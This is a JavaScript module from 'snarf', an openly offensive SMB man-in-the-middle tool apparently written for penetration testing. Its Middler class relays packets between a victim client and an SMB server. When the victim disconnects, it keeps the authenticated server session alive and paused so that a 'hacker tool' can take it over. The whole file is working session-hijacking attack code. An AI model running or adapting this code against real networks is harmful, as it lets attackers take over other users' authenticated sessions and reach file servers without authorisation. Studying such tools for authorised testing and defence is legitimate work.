//
// snarf - SMB man-in-the-middle tool
// Copyright (C) 2015 Josh Stone (yakovdk@gmail.com)
//                    Victor Mata (victor@offense-in-depth.com)
//
// This program is free software; you can redistribute it and/or
// modify it under the terms of the GNU General Public License
// as published by the Free Software Foundation; either version 2
// of the License, or (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software
// Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
//
// ------------------------------------------------------------------------

var net    = require("net");
var smb    = require("./smb.js");
var out    = require ("./out.js");
var moment = require("moment");

function Middler(id) {
    var client;
    var server;
    var clientIP;
    var clientPort;
    var serverIP;
    var reqPackets     = [];
    var respPackets    = [];
    var hackercount    = 0;
    var broker         = undefined;
    var myself         = this;
    var collectPackets = false;
    var hostname       = "unknown";
    var freshness      = moment();
    var active         = true;
    var mature; // this variable tells when the client has released the client socket

    this.attributes = new Object;
    this.attributes.logon_failed = false;
    
    this.expired = false;

    // This may seem like a waste to define all of these accessors,
    // but this is in anticipation of this functionality either
    // getting more cmoplicated in the future or a potential need to
    // subclass the Middler class for other protocols.  As such, we
    // don't want the idea that these items are simply variables to
    // get too firmly coupled to the rest of the Snarf system.

    this.setActive = function(state) {
        active = state;
    }

    this.getActive = function() {
        return active;
    }

    this.freshen = function() {
        freshness = moment();
    }

    this.getFreshness = function() {
        return freshness;
    }

    this.shutdown = function() {
        out.red("Can't shutdown session that hasn't been setup yet");
    }

    this.getID = function() {
        return id;
    }

    this.getRespPackets = function() {
        return respPackets;
    }

    this.getReqPackets = function() {
        return reqPackets;
    }

    this.getClient = function() {
        return client;
    }

    this.getServer = function() {
        return server;
    }

    this.getClientAddr = function() {
        return clientIP;
    }

    this.getMature = function() {
        return mature;
    }

    this.setMature = function(val) {
        mature = val;
    }

    this.getServerAddr = function() {
        return serverIP;
    }

    this.getClientPort = function() {
        return clientPort;
    }

    this.setID = function(i) {
        id = i;
    }

    this.setClientInfo = function(addr, port, dest) {
        clientIP   = addr;
        clientPort = port;
        serverIP   = dest;
    }

    this.setBroker = function(b) {
        broker = b;
    }

    this.setClient = function(s) {
        client = s;
    }

    this.terminate = function() {
        if(server) server.end();
    }

    this.expire = function() {
        this.shutdown();
    }

    // The server component is actually a client socket connected to
    // the distant server.  I know, using a client socket to represent
    // a server is awkward, but it's not a simple arrangement anyway.
    // This code primarily shuffles responses from the server back to
    // the appropriate client process.

    this.setServer = function(val) {
        var myself = this;
        server     = val;

        server.on('data', function(x) {
            var packet = broker.parsePacket(x);
            if(myself.collectPackets) {
                respPackets.push(packet);
            }
            broker.reviewServerPacket(packet, client, myself);
	    if(myself.attributes.logon_failed == true) {
		myself.rewire(server, client);
	    }
        });

        server.on('end', function(data) {
            out.red("Encountered 'end' event from server");
            broker.deactivateMiddler(id);
        });

        server.on('error', function(data) {
            server.pause();

            out.red("Encountered error from server");
            broker.deactivateMiddler(myself);
        });
    }

    // We need to trap some authenticated session.  This is the
    // "originalClient".  About the only thing that makes this
    // different from a port redirector is that when the connection
    // dies, we find a hacker tool to substitute.

    this.setOriginalClient = function(val) {
        var myself = this;
        client     = val;

        this.shutdown = function() {
            myself.expired = true;
            out.red("Activating middler");
            broker.activateMiddler(myself);
            client.end();
            if(client) {
                out.red("Destroying client socket!");
                client.destroy();
            }
            client = undefined;
            server.resume();
        }

        client.on('data', function(x) {
            var packet = broker.parsePacket(x);
            if(myself.collectPackets) {
                reqPackets.push(packet);
            }
            out.green("[" + myself.getID() + "] Client: " + packet.describe());
            broker.reviewClientPacket(packet, server, myself);
        });

        client.on("error", function() {
            server.pause();
            myself.shutdown();
        });

        client.on('end', function() {
            server.pause();
            myself.shutdown();
        });
    }

    this.rewire = function(server, client) {
	out.red("Rewiring middler as dumb relay until it dies");
	server.on('data', function(x) {
	    client.write(x);
	});
	client.on('data', function(x) {
	    server.write(x);
	});
	server.on('end', function() {
	    myself.terminate();
	});
	client.on('end', function() {
	    myself.terminate();
	});
	server.on('error', function() {
	    myself.terminate();
	});
	client.on('error', function() {
	    myself.terminate();
	});
    }
}

module.exports.NullMiddler = function(x) {
    x.on('data', function(x) {
        out.red("Shouldn't get data");
    });

    x.on('error', function() {
        out.red("Shouldn't get errors");
    });

    x.on('end', function() {
        out.red("Closing down socket\n");
    });
}

module.exports.Relay = function(client, server) {
    client.on('data', function(data) { server.write(data); });
    server.on('data', function(data) { client.write(data); });

    client.on('end', function(data) { });
    server.on('end', function(data) { });

    client.on('error', function(data) { });
    server.on('error', function(data) { });
}

module.exports.Middler = Middler;
